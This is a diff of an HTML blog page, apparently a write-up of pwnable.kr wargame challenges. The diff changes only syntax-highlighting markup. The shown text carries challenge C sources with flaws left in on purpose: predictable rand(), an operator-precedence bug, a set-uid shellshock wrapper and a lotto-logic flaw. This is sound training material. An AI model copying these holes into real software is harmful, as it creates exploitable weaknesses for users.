-</span></span><span class="line"><span class="cl">        <span class="n">random</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>        <span class="c1">// random value!
+</span></span><span class="line"><span class="cl">        <span class="n">random</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">();</span>        <span class="c1">// random value!
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span> 
 </span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key</span> <span class="o">^</span> <span class="n">random</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span> <span class="p">){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Good!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Good!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wrong, maybe you should try 2^32 cases.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong, maybe you should try 2^32 cases.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
@@ -609,10 +608,10 @@
 </span></span><span class="line"><span class="cl">Mommy, I thought libc random is unpredictable...
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="7-input">7 input</h2>
-<h2 id="8-leg">8 leg</h2>
-<h2 id="9-mistake">9 mistake</h2>
-<div class="highlight"><div class="chroma">
+</div><h2 id="7-input" class="headerLink">
+    <a href="#7-input" class="header-mark"></a>7 input</h2><h2 id="8-leg" class="headerLink">
+    <a href="#8-leg" class="header-mark"></a>8 leg</h2><h2 id="9-mistake" class="headerLink">
+    <a href="#9-mistake" class="header-mark"></a>9 mistake</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -689,32 +688,32 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;can&#39;t open password %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;can&#39;t open password %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;do not bruteforce...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;do not bruteforce...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="nf">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">pw_buf</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">len</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">pw_buf</span><span class="p">,</span><span class="n">PW_LEN</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;read error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">len</span><span class="o">=</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">pw_buf</span><span class="p">,</span><span class="n">PW_LEN</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;read error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">pw_buf2</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;input password : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%10s&#34;</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;input password : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%10s&#34;</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// xor your input
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">xor</span><span class="p">(</span><span class="n">pw_buf2</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">pw_buf</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">,</span> <span class="n">PW_LEN</span><span class="p">)){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Password OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">xor</span><span class="p">(</span><span class="n">pw_buf2</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">pw_buf</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">,</span> <span class="n">PW_LEN</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Password OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wrong Password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong Password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
@@ -725,7 +724,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="n">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>乍一看没什么不对, 当返回的文件描述符小于0时报错
@@ -750,8 +749,8 @@
 </span></span><span class="line"><span class="cl">Mommy, the operator priority always confuses me :(
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="10-shellshock">10 shellshock</h2>
-<p>这是一个set-uid程序:</p>
+</div><h2 id="10-shellshock" class="headerLink">
+    <a href="#10-shellshock" class="header-mark"></a>10 shellshock</h2><p>这是一个set-uid程序:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -765,9 +764,9 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">setresuid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
-</span></span><span class="line"><span class="cl">        <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
-</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/home/shellshock/bash -c &#39;echo shock_me&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">setresuid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">setresgid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/home/shellshock/bash -c &#39;echo shock_me&#39;&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
@@ -809,8 +808,8 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">setresuid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
-</span></span><span class="line"><span class="cl"><span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">setresuid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nf">setresgid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>确保了这一点.
@@ -829,10 +828,10 @@
 </span></span><span class="line"><span class="cl">shellshock@ubuntu:~$
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="11-coin1">11 coin1</h2>
-<h2 id="12-blackjack">12 blackjack</h2>
-<h2 id="13-lotto">13 lotto</h2>
-<p>lotto.c:</p>
+</div><h2 id="11-coin1" class="headerLink">
+    <a href="#11-coin1" class="header-mark"></a>11 coin1</h2><h2 id="12-blackjack" class="headerLink">
+    <a href="#12-blackjack" class="header-mark"></a>12 blackjack</h2><h2 id="13-lotto" class="headerLink">
+    <a href="#13-lotto" class="header-mark"></a>13 lotto</h2><p>lotto.c:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -943,33 +942,33 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">play</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Submit your 6 lotto bytes : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Submit your 6 lotto bytes : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">r</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">submit</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Lotto Start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">submit</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Lotto Start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//sleep(1);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">// generate lotto numbers
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">==-</span><span class="mi">1</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;error. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;error. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">lotto</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">lotto</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;error2. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">lotto</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;error2. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">                <span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="mi">45</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>         <span class="c1">// 1 ~ 45
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">// calculate lotto score
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
@@ -984,23 +983,23 @@
 </span></span><span class="line"><span class="cl">        <span class="c1">// win!
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">match</span> <span class="o">==</span> <span class="mi">6</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bad luck...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;bad luck...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">help</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- nLotto Rule -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;nlotto is consisted with 6 random natural numbers less than 46</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;your goal is to match lotto numbers as many as you can</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;if you win lottery for *1st place*, you will get reward</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;for more details, follow the link below</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;mathematical chance to win this game is known to be 1/8145060.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;- nLotto Rule -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;nlotto is consisted with 6 random natural numbers less than 46</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;your goal is to match lotto numbers as many as you can</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;if you win lottery for *1st place*, you will get reward</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;for more details, follow the link below</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;mathematical chance to win this game is known to be 1/8145060.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
@@ -1009,23 +1008,23 @@
 </span></span><span class="line"><span class="cl">        <span class="c1">// menu
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">menu</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">		        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- Select Menu -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;1. Play Lotto</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;2. Help</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;3. Exit</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">menu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;- Select Menu -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;1. Play Lotto</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;2. Help</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;3. Exit</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">menu</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">                        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                                <span class="n">play</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                                <span class="nf">play</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">                        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
